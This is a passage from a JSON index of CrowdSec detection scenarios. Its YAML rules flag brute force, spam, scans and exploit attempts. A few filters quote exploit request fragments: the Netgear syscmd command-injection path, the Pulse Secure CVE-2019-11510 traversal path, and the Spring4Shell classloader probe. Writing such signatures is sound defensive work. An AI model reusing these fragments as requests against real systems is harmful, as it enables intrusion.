spoofable: 0\n  confidence: 2\n  service: http\n", "description": "Web exploitation via modsecurity", "path": "scenarios/crowdsecurity/modsecurity.yaml", "version": "0.6", "versions": {"0.1": {"digest": "447c63986f53a743d08fc16677d7f5427ed4b7efca6a0d73c47991d83582e0d0"}, "0.2": {"digest": "45c2a35d4ee071e66197aa2381b0c066a18d17fe6b8aee7b0e83efb21512cdbc"}, "0.3": {"digest": "91e21cd506aa43e1895be93fa3e93dbad64403edafe9ae1e87f2519689ec3f66"}, "0.4": {"digest": "2e2f2591a614514acf033702c5588335136050925f88f36fb9da0bc129f30039"}, "0.5": {"digest": "23c32d105550893e7facd768035f57e7413c1802f52bf93b6540b5d01746a560"}, "0.6": {"digest": "7930d21b866591673c8c7d70ca43a7919a361c22b194f6cc2482381dd0e5f46b"}}}, "crowdsecurity/mssql-bf": {"content": "# mysql bruteforce\ntype: leaky\n#debug: true\nname: crowdsecurity/mssql-bf\ndescription: \"Detect mssql bruteforce\"\nfilter: evt.Meta.log_type == 'mssql_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1110\n  behavior: \"database:bruteforce\"\n  label: \"MSSQL Bruteforce\"\n  spoofable: 0\n  confidence: 3\n  service: mssql\n", "description": "Detect mssql bruteforce", "path": "scenarios/crowdsecurity/mssql-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "be8f99681f224e5176015815d11bf01b0e0012ceb24bbb264786f503d9146d81"}, "0.2": {"digest": "ac0fc68fb2064422e0743f1e9a0f10c13d8881a2298b6152899f2b84d293b148"}}}, "crowdsecurity/mysql-bf": {"content": "# mysql bruteforce\ntype: leaky\n#debug: true\nname: crowdsecurity/mysql-bf\ndescription: \"Detect mysql bruteforce\"\nfilter: evt.Meta.log_type == 'mysql_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"database:bruteforce\"\n  label: \"MySQL Bruteforce\"\n  service: mysql\n", "description": "Detect mysql bruteforce", "path": "scenarios/crowdsecurity/mysql-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "3783ff9de7b6d19697ee121314b20b21b8c765b279a9caacc70d3c75f4ebd455"}, "0.2": {"digest": "0e32a1c1d87086a9a0d51208025a61f4c7f1833e50c95959a4c8a1fff86bff5a"}}}, "crowdsecurity/naxsi-exploit-vpatch": {"content": "# naxsi vpatch rules detection\ntype: trigger\nname: crowdsecurity/naxsi-exploit-vpatch\n# id is bigger than 9k, custom rule\ndescription: \"Detect custom blacklist triggered in naxsi\"\nfilter: \"evt.Meta.log_type == 'waf_naxsi-log' && len(evt.Parsed.naxsi_id) > 4\"\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 5m\nlabels:\n  remediation: true\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1595\n    - attack.T1190\n  behavior: \"http:exploit\"\n  service: http\n", "description": "Detect custom blacklist triggered in naxsi", "path": "scenarios/crowdsecurity/naxsi-exploit-vpatch.yaml", "version": "0.2", "versions": {"0.1": {"digest": "908ceeb2d7f5607a114a872847df34662e4c80ed07338a55f125a56985f0d095"}, "0.2": {"digest": "5899c88353cdb50f0be57a818488ead9e320b4e81260acd610186c855b1d6716"}}}, "crowdsecurity/netgear_rce": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/netgear_rce\ndescription: \"Detect Netgear RCE DGN1000/DGN220 exploitation attempts\"\nfilter: |\n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] && Lower(QueryUnescape(evt.Meta.http_path)) startsWith Lower('/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=')\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nreferences:\n  - \"https://www.exploit-db.com/exploits/25978\"\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2024-12847\n  behavior: \"http:exploit\"\n  label: \"Netgear RCE\"\n  service: netgear\n  remediation: true\n", "description": "Detect Netgear RCE DGN1000/DGN220 exploitation attempts", "path": "scenarios/crowdsecurity/netgear_rce.yaml", "references": ["https://www.exploit-db.com/exploits/25978"], "version": "0.4", "versions": {"0.1": {"digest": "da6b213c4c31c81a22e52b573428cd78a76cb9c00f810d0835f7831f8f80eb5d"}, "0.2": {"digest": "14411baac71dcd8fa5be5c9973f36b8c6f880865e1a3004674007a0bec64212d"}, "0.3": {"digest": "4b88489256201cb7341ffc5e9cefba6f3a695b8275096d32d409052e7c4d33ab"}, "0.4": {"digest": "e3c2fa9f0fd75c3a290adcdf3b86799d9c31bc6c9f5b8a9e6d874c2b2c68ee53"}}}, "crowdsecurity/nextcloud-bf": {"content": "---\ntype: leaky\nname: crowdsecurity/nextcloud-bf\ndescription: \"Detect Nextcloud bruteforce\"\nfilter: \"evt.Meta.log_type in ['nextcloud_failed_auth', 'nextcloud_bruteforce_attempt']\"\nleakspeed: \"1m\"\ncapacity: 5\n# if we have bruteforce protection enabled in nextcloud, the same login attempt\n# can log # both login failure and bruteforce attempt at the same time, so\n# keep them in seperate buckets\ngroupby: evt.Meta.source_ip + '--' + evt.Meta.log_type\nblackhole: 5m\nreprocess: true\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"NextCloud Bruteforce\"\n  service: nextcloud\n---\ntype: leaky\nname: crowdsecurity/nextcloud-bf_user_enum\ndescription: \"Detect Nextcloud user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'nextcloud_failed_auth'\"\nleakspeed: \"1m\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nblackhole: 5m\nreprocess: true\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"NextCloud Bruteforce\"\n  service: nextcloud\n---\ntype: leaky\nname: crowdsecurity/nextcloud-bf_domain_error\ndescription: \"Detect Nextcloud domain error\"\nfilter: \"evt.Meta.log_type == 'nextcloud_domain_error'\"\nleakspeed: \"1m\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"NextCloud Bruteforce\"\n  service: nextcloud\n", "description": "Detect Nextcloud bruteforce", "path": "scenarios/crowdsecurity/nextcloud-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "4a6b24a95d286e48aec8eb59fa5fc17686a724be3c7860df538a7eafdb613f97"}, "0.2": {"digest": "6ba276c92b2d1a9b43bff6afa09f09c1d1b7fccb9b87d649eedba803689914d8"}, "0.3": {"digest": "75b4f296618a383fd240413fd51bae1be786872d4f1b46421c8871d43c15d128"}}}, "crowdsecurity/nginx-req-limit-exceeded": {"content": "type: leaky\n#debug: true\nname: crowdsecurity/nginx-req-limit-exceeded\ndescription: \"Detects IPs which violate nginx's user set request limit.\"\nfilter: evt.Meta.sub_type == 'req_limit_exceeded'\nleakspeed: \"60s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  remediation: true\n  confidence: 2\n  spoofable: 2\n  classification:\n    - attack.T1498\n  behavior: \"http:dos\"\n  label: \"Nginx request limit exceeded\"\n  service: http\n", "description": "Detects IPs which violate nginx's user set request limit.", "path": "scenarios/crowdsecurity/nginx-req-limit-exceeded.yaml", "version": "0.3", "versions": {"0.1": {"digest": "7e6fa2b7386d763b570025b3144c8790f68463f7c5739d8f527c9f80f15c15ce"}, "0.2": {"digest": "f064319bf72d0df012495cd33acc005ca934314519adc06d8175c8cfa84c2e18"}, "0.3": {"digest": "d135e5fe0f486f5f5223006c53324b51b5b1130c4d71fcf51f75e13b8575cc03"}}}, "crowdsecurity/odoo-bf_user-enum": {"content": "# Odoo web auth bruteforce\ntype: leaky\n#debug: true\nname: crowdsecurity/odoo-bf\ndescription: \"Detect bruteforce on odoo web interface\"\nfilter: evt.Meta.log_type == 'odoo_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Odoo Bruteforce\"\n  service: odoo\n---\n# Odoo web auth user_enum\ntype: leaky\nname: crowdsecurity/odoo_user-enum\ndescription: \"Detect odoo user enum\"\nfilter: evt.Meta.log_type == 'odoo_failed_auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Odoo Bruteforce\"\n  service: odoo\n", "description": "Detect bruteforce on odoo web interface", "path": "scenarios/crowdsecurity/odoo-bf_user-enum.yaml", "version": "0.2", "versions": {"0.1": {"digest": "ece8333dbfb283c4b696c2963ede3636175306d65151a26bbb2ecdcd19455e53"}, "0.2": {"digest": "292468af8f31901e3aeaa6db5609c90be59f6b6c5dd5af9c40a22c74f1053913"}}}, "crowdsecurity/opnsense-gui-bf": {"content": "# opnsense web auth bruteforce\ntype: leaky\n#debug: true\nname: crowdsecurity/opnsense-gui-bf\ndescription: \"Detect bruteforce on opnsense web interface\"\nfilter: evt.Meta.log_type == 'opnsense-gui-failed-auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"OPNsense GUI Bruteforce\"\n  service: opnsense\n", "description": "Detect bruteforce on opnsense web interface", "path": "scenarios/crowdsecurity/opnsense-gui-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "15f0d4f03f1e18a8cd5d95467a13e86ebfd717354f53ba02b4d165e6537965bf"}, "0.2": {"digest": "c1031635c18c69203a1e251d25da8f309182ed04221142e94e3a2ff1d8533af3"}, "0.3": {"digest": "5f06456ab0875a8245a6863775ccfe215f3d8a38da562dbcb9de97756aea188a"}}}, "crowdsecurity/palo-alto-threat": {"content": "type: trigger\ndebug: false\nname: crowdsecurity/palo-alto-threat\nfilter: evt.Meta.log_type == \"palo_alto\" && evt.Meta.severity in [\"medium\", \"high\", \"critical\"]\ndescription: Detect palo alto threat with a severity higher or equal to medium\nblackhole: 2m\nlabels:\n  remediation: true\ngroupby: \"evt.Meta.source_ip\"\n", "description": "Detect palo alto threat with a severity higher or equal to medium", "path": "scenarios/crowdsecurity/palo-alto-threat.yaml", "version": "0.1", "versions": {"0.1": {"digest": "9341b00080dbba122150bd55cd155e916fc9a972a6e956b96ed517b09618fbf1"}}}, "crowdsecurity/pfsense-gui-bf": {"content": "# pfsense web auth bruteforce\ntype: leaky\n#debug: true\nname: crowdsecurity/pfsense-gui-bf\ndescription: \"Detect bruteforce on pfsense web interface\"\nfilter: evt.Meta.log_type == 'pfsense-gui-failed-auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"pfSense GUI Bruteforce\"\n  service: pfsense\n", "description": "Detect bruteforce on pfsense web interface", "path": "scenarios/crowdsecurity/pfsense-gui-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "b23ed9edafd3b8cea053d4286abfc2513d53c54904e7348b4fc1bf24e9e3a77d"}, "0.2": {"digest": "07019c43c3bbd31e077d12c85aea855332e6891db2605bae00a481dacf17826f"}}}, "crowdsecurity/pgsql-bf": {"content": "# pgsql bruteforce\ntype: leaky\n#debug: true\nname: crowdsecurity/pgsql-bf\ndescription: \"Detect PgSQL bruteforce\"\nfilter: evt.Meta.log_type == 'pgsql_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n service: pgsql\n remediation: true\n confidence: 3\n spoofable: 0\n classification:\n  - attack.T1110\n behavior: \"database:bruteforce\"\n label: \"Postgres Bruteforce\"\n", "description": "Detect PgSQL bruteforce", "path": "scenarios/crowdsecurity/pgsql-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "d2b7d3aa914ba9204f320e15301207c0fb5ea54aae57481bcbcd410cd81629bd"}, "0.2": {"digest": "133fed2f8b3d0479817fcc3e0991a872ef5199adb73f5530220d10bccc6c0df0"}}}, "crowdsecurity/pgsql-user-enum": {"content": "type: leaky\nname: crowdsecurity/pgsql-user-enum\ndescription: \"Detect postgresql user enumeration\"\nfilter: evt.Meta.log_type == 'pgsql_failed_auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n service: pgsql\n remediation: true\n confidence: 3\n spoofable: 0\n classification:\n  - attack.T1110\n  - attack.T1589\n behavior: \"database:bruteforce\"\n label: \"Postgres Bruteforce\"", "description": "Detect postgresql user enumeration", "path": "scenarios/crowdsecurity/pgsql-user-enum.yaml", "version": "0.2", "versions": {"0.1": {"digest": "b9947e219aed3c267b0fa8ca4805d840a3ebf5ee1f0bf978cebb0f711e21336d"}, "0.2": {"digest": "d85a0ac7af5f8d9b0e3678ff8f48c8524ce0a8a5f86ac94961d989afc2ee912a"}}}, "crowdsecurity/postfix-helo-rejected": {"content": "# postfix helo rejected because it did not match postfix restrictions\ntype: leaky\nname: crowdsecurity/postfix-helo-rejected\ndescription: \"Detect HELO rejections\"\nfilter: \"evt.Meta.log_type == 'postfix' && evt.Meta.action == 'reject' && evt.Meta.reason startsWith 'Helo command rejected'\"\nreferences:\n  - https://www.postfix.org/postconf.5.html#smtpd_helo_restrictions\ngroupby: evt.Meta.source_ip\ncapacity: 1\nleakspeed: 600s\nblackhole: 1m\nreprocess: false\nlabels:\n  service: postfix\n  remediation: true\n  confidence: 2\n  spoofable: 0\n  classification:\n  - attack.T1595\n  - attack.T1592\n  behavior: \"smtp:spam\"\n  label: \"Postfix Helo Rejected\"\n", "description": "Detect HELO rejections", "path": "scenarios/crowdsecurity/postfix-helo-rejected.yaml", "references": ["https://www.postfix.org/postconf.5.html#smtpd_helo_restrictions"], "version": "0.1", "versions": {"0.1": {"digest": "521fce8ce65b0693dd82399e001ec547f097b33a568501e49e0df22cbc281fc7"}}}, "crowdsecurity/postfix-non-smtp-command": {"content": "type: trigger\nname: crowdsecurity/postfix-non-smtp-command\ndescription: \"Detect scanning of postfix service through non-SMTP commands\"\nfilter: \"evt.Meta.service == 'postfix' && evt.Meta.log_type_enh == 'non-smtp-command'\"\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: false\nlabels:\n  service: postfix\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  behavior: \"generic:scan\"\n  label: \"Postfix Non-SMTP Command\"", "description": "Detect scanning of postfix service through non-SMTP commands", "path": "scenarios/crowdsecurity/postfix-non-smtp-command.yaml", "version": "0.1", "versions": {"0.1": {"digest": "889ed4023489c664112def811769121139fdc572f2efcd062d34c9443b5fcdb3"}}}, "crowdsecurity/postfix-relay-denied": {"content": "# postfix relay access denied\ntype: leaky\nname: crowdsecurity/postfix-relay-denied\ndescription: \"Detect multiple open relay attempts\"\nfilter: \"evt.Meta.log_type == 'postfix' && evt.Meta.action == 'reject' && evt.Meta.reason == 'Relay access denied'\"\nreferences:\n  - https://en.wikipedia.org/wiki/Open_mail_relay\ngroupby: evt.Meta.source_ip\ncapacity: 1\nleakspeed: 600s\nblackhole: 1m\nreprocess: false\nlabels:\n  service: postfix\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n  - attack.T1595\n  - attack.T1190\n  behavior: \"smtp:spam\"\n  label: \"Postfix Relay Denied\"\n", "description": "Detect multiple open relay attempts", "path": "scenarios/crowdsecurity/postfix-relay-denied.yaml", "references": ["https://en.wikipedia.org/wiki/Open_mail_relay"], "version": "0.1", "versions": {"0.1": {"digest": "ef60099a5b179d375f626157c6856ae28fa8d2b850fba96c6a4f4f94bf53227c"}}}, "crowdsecurity/postfix-spam": {"content": "# postfix spam\ntype: leaky\nname: crowdsecurity/postfix-spam\ndescription: \"Detect spammers\"\nfilter: \"evt.Meta.log_type_enh == 'spam-attempt' || evt.Meta.log_type == 'postfix' && evt.Meta.action == 'reject'\"\nleakspeed: \"10s\"\nreferences:\n  - https://en.wikipedia.org/wiki/Spamming\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: false\nlabels:\n  service: postfix\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  behavior: \"smtp:spam\"\n  label: \"Postfix Spam\"\n---\n# postfix spam\ntype: trigger\nname: crowdsecurity/postscreen-rbl\ndescription: \"Detect spammers\"\nfilter: \"evt.Meta.service == 'postscreen' && evt.Meta.pregreet == 'PREGREET'\"\nreferences:\n  - https://en.wikipedia.org/wiki/Spamming\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: false\nlabels:\n  service: postscreen\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  behavior: \"smtp:spam\"\n  label: \"Postfix Spam\"\n", "description": "Detect spammers", "path": "scenarios/crowdsecurity/postfix-spam.yaml", "references": ["https://en.wikipedia.org/wiki/Spamming"], "version": "0.4", "versions": {"0.1": {"digest": "03876677d3fe37bdc9ad584cb015e3f0b648266450b2b494a40e1863d5a64d8a"}, "0.2": {"digest": "b36d95dc5ba9cb45c8cbb1a3d37bd19d929ed387f3d7ec386b4e9e041d0bbd8e"}, "0.3": {"digest": "a423cda10b76d41849ee9cb120f8a9c6aeb90afbd63fc9251966704a4878197f"}, "0.4": {"digest": "6fcda4316cfd2284cfa778270fe33e4c825dce8c49d2ee166b8f01550fb8f1ae"}}}, "crowdsecurity/proftpd-bf": {"content": "type: leaky\nname: crowdsecurity/proftpd-bf\ndescription: \"Detect proftpd bruteforce\"\nfilter: \"evt.Meta.log_type == 'ftp_failed_auth'\"\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n service: proftpd\n remediation: true\n confidence: 3\n spoofable: 0\n classification:\n  - attack.T1110\n behavior: \"ftp:bruteforce\"\n label: \"Proftpd Bruteforce\"\n", "description": "Detect proftpd bruteforce", "path": "scenarios/crowdsecurity/proftpd-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "f241fba9f1ffeb3cdf376bb7cfee0ecf804ba5d8709cfb5defbc973a11c751a5"}, "0.2": {"digest": "a77e311aad794a2f70e838e1b3b4017448af74511e9acc6b154052294fa87b38"}}}, "crowdsecurity/proftpd-bf_user-enum": {"content": "type: leaky\nname: crowdsecurity/proftpd-bf_user-enum\ndescription: \"Detect proftpd user enum bruteforce\"\nfilter: evt.Meta.log_type == 'ftp_failed_auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n service: proftpd\n remediation: true\n confidence: 3\n spoofable: 0\n classification:\n  - attack.T1110\n  - attack.T1190\n behavior: \"ftp:bruteforce\"\n label: \"Proftpd Bruteforce\"\n", "description": "Detect proftpd user enum bruteforce", "path": "scenarios/crowdsecurity/proftpd-bf_user-enum.yaml", "version": "0.2", "versions": {"0.1": {"digest": "7e3b3f8d050805afce54785fe1e9eba40a6a040faf9e19e8ba40d466c3b14814"}, "0.2": {"digest": "79eb461691ff5555246915d3fdc668239ce988ea02e8b2ce62cf34d80bfdb3d6"}}}, "crowdsecurity/pulse-secure-sslvpn-cve-2019-11510": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/pulse-secure-sslvpn-cve-2019-11510\ndescription: \"Detect cve-2019-11510 exploitation attemps\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and \n    (Upper(evt.Meta.http_path) matches Upper('/dana-na/../dana/html5acc/guacamole/../../../../../../../[^?]+\\\\?/dana/html5acc/guacamole/')\n    or\n    Upper(evt.Meta.http_path) matches Upper('/dana-na/%2E%2E/dana/html5acc/guacamole/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/[^?]+\\\\?/dana/html5acc/guacamole/'))\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - cve.CVE-2019-11510\n  behavior: \"http:exploit\"\n  label: \"Pulse Secure CVE-2019-11510\"\n  service: pulse-secure\n", "description": "Detect cve-2019-11510 exploitation attemps", "path": "scenarios/crowdsecurity/pulse-secure-sslvpn-cve-2019-11510.yaml", "version": "0.3", "versions": {"0.1": {"digest": "bab1d5aa6ee0f6677d73c70438324006f4ed0780de90891a8586030319dc1d08"}, "0.2": {"digest": "9226dd76fd3e818b3a6d4a1770437e1a41a2014e082cde2a788244b50fb83889"}, "0.3": {"digest": "7807f49e188dc01411c027897f4b608fb5b58d621a175b6ba934b76b214664da"}}}, "crowdsecurity/sabnzbd-bf": {"content": "# sabnzbd bruteforce\ntype: leaky\nname: crowdsecurity/sabnzbd-bf\ndescription: \"Detect sabnzbd bruteforce\"\nfilter: \"evt.Meta.service == 'sabnzbd' && evt.Meta.log_type == 'sabnzbd_failed_auth'\"\nleakspeed: \"10s\"\ncapacity: 3\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: sabnzbd\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Sabnzbd Bruteforce\"\n  behavior: \"generic:bruteforce\"\n  remediation: true\n---\n# sabnzbd slow bruteforce\ntype: leaky\nname: crowdsecurity/sabnzbd-slow-bf\ndescription: \"Detect sabnzbd slow bruteforce\"\nfilter: \"evt.Meta.service == 'sabnzbd' && evt.Meta.log_type == 'sabnzbd_failed_auth'\"\nleakspeed: \"60s\"\ncapacity: 10\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: sabnzbd\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Sabnzbd Bruteforce\"\n  behavior: \"generic:bruteforce\"\n  remediation: true", "description": "Detect sabnzbd bruteforce", "path": "scenarios/crowdsecurity/sabnzbd-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "ea47b08a24c258fe669757e44b6cdca6c02512738e89625c6cd47cf454333ae6"}}}, "crowdsecurity/smb-bf": {"content": "# smb bruteforce\ntype: leaky\nname: crowdsecurity/smb-bf\ndescription: \"Detect smb bruteforce\"\nfilter: evt.Meta.log_type == 'smb_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n service: smb\n remediation: true\n confidence: 3\n spoofable: 0\n classification:\n  - attack.T1110\n behavior: \"smb:bruteforce\"\n label: \"SMB Bruteforce\"", "description": "Detect smb bruteforce", "path": "scenarios/crowdsecurity/smb-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "ee7fea38f0a67bde1aae3979cf0579da03da5adf4e69826f12a82c74b812e9d6"}, "0.2": {"digest": "a751e12a752fe652203deeb380e276a38258252296e26c27f6ccaeff038357f9"}}}, "crowdsecurity/spring4shell_cve-2022-22965": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/spring4shell_cve-2022-22965\ndescription: \"Detect cve-2022-22965 probing\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and\n    (Upper(evt.Meta.http_path) contains 'CLASS.MODULE.CLASSLOADER.')\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - cve.CVE-2022-22965\n  behavior: \"http:exploit\"\n  label: \"Spring4shell CVE-2022-22965\"\n  service: spring\n", "description": "Detect cve-2022-22965 probing", "path": "scenarios/crowdsecurity/spring4shell_cve-2022-22965.yaml", "version": "0.3", "versions": {"0.1": {"digest": "b16993a7d1fe816230f0fef23e11736019a67a7fa64c5a5cc25e15589764cdcf"}, "0.2": {"digest": "4e03166936f61abd0711167960b06bff7dbffb37b0642ab2a6cba6eb9da9ee98"}, "0.3": {"digest": "c304e9bd45fb6dc79782d2e12f5e4cf646bd984178a0414ecd6c59162ba15cee"}}}, "crowdsecurity/ssh-bf": {"content": "# ssh bruteforce\ntype: leaky\nname: crowdsecurity/ssh-bf\ndescription: \"Detect ssh bruteforce\"\nfilter: \"evt.Meta.log_type == 'ssh_failed-auth'\"\nleakspeed: \"10s\"\nreferences:\n  - http://wikipedia.com/ssh-bf-is-bad\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: ssh\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"SSH Bruteforce\"\n  behavior: \"ssh:bruteforce\"\n  remediation: true\n---\n# ssh user-enum\ntype: leaky\nname: crowdsecurity/ssh-bf_user-enum\ndescription: \"Detect ssh user enum bruteforce\"\nfilter: evt.Meta.log_type == 'ssh_failed-auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: ssh\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n  behavior: \"ssh:bruteforce\"\n  label: \"SSH User Enumeration\"\n", "description": "Detect ssh bruteforce", "path": "scenarios/crowdsecurity/ssh-bf.yaml", "references": ["http://wikipedia.com/ssh-bf-is-bad"], "version": "0.3", "versions": {"0.1": {"digest": "4441dcff07020f6690d998b7101e642359ba405c2abb83565bbbdcee36de280f"}, "0.2": {"digest": "94b1d6f04e9119ea1adb7fc70017fd108cede97bddbaf50b0b2bebdcc887ea28"}, "0.3": {"digest": "242f36684d66bbae3044e576b7cfffef62d5323465f3f74f87923167c6d93356"}}}, "crowdsecurity/ssh-cve-2024-6387": {"content": "# ssh bruteforce\ntype: leaky\nname: crowdsecurity/ssh-cve-2024-6387\ndescription: \"Detect exploitation attempt of CVE-2024-6387\"\nfilter: \"evt.Meta.log_type in ['ssh_auth_timeout', 'ssh_dispatch_fatal']\"\nleakspeed: \"180s\"\ncapacity: 3\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: ssh\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - cve.CVE-2024-6387\n  label: \"SSH CVE-2024-6387\"\n  behavior: \"ssh:exploit\"\n  remediation: true\n", "description": "Detect exploitation attempt of CVE-2024-6387", "path": "scenarios/crowdsecurity/ssh-cve-2024-6387.yaml", "version": "0.2", "versions": {"0.1": {"digest": "1a36e33f8743790c5544faa999aa8dd062f6e2b696e16232d3a3f28576119503"}, "0.2": {"digest": "7888f1f31ea75d55f7b4bdf56b6f0840ca4ecbd937af0655cdf263062a11e85a"}}}, "crowdsecurity/ssh-generic-test": {"content": "# ssh bruteforce\ntype: trigger\nname: crowdsecurity/ssh-generic-test\ndescription:  \"Crowdsec Generic Test Scenario: SSH brute force trigger\"\nfilter: \"evt.Meta.log_type == 'ssh_failed-auth' && evt.Meta.target_user == 'crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl'\"\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: ssh\n  remediation: false\n  confidence: 0\n  spoofable: 3\n  classification:\n    - attack.T1110\n  behavior: \"ssh:bruteforce\"\n  label: \"Crowdsec Generic Test Scenario\"\n", "description": "Crowdsec Generic Test Scenario: SSH brute force trigger", "path": "scenarios/crowdsecurity/ssh-generic-test.yaml", "version": "0.2", "versions": {"0.1": {"digest": "bcdd71f60c2e9e2b81b2e4ccf5989246535801c52a1857112b802a7c759049a0"}, "0.2": {"digest": "eeb36b8d7ecd18a286e3e3fda9e3dd313b41476cd2fda342a2e8f49c7915f067"}}}, "crowdsecurity/ssh-refused-conn": {"content": "type: trigger\nname: crowdsecurity/ssh-refused-conn\ndescription: \"Detect sshd refused connections\"\nfilter: \"evt.Meta.log_type == 'ssh_refused_conn'\"\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: false\nlabels:\n  service: ssh\n  confidence: 0\n  spoofable: 0\n  classification:\n    - attack.T1595\n  label: \"SSH Refused Connection\"\n  behavior: \"generic:scan\"\n  remediation: true\n", "description": "Detect sshd refused connections", "path": "scenarios/crowdsecurity/ssh-refused-conn.yaml", "version": "0.1", "versions": {"0.1": {"digest": "807d77f85f08443df8d709eb5e7f4ca8b33d5be664804214af53a1edbe481fd6"}}}, "crowdsecurity/ssh-slow-bf": {"content": "# ssh bruteforce\ntype: leaky\nname: crowdsecurity/ssh-slow-bf\ndescription: \"Detect slow ssh bruteforce\"\nfilter: \"evt.Meta.log_type == 'ssh_failed-auth'\"\nleakspeed: \"60s\"\nreferences:\n  - http://wikipedia.com/ssh-bf-is-bad\ncapacity: 10\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: ssh\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"ssh:bruteforce\"\n  label: \"SSH Slow Bruteforce\"\n---\n# ssh 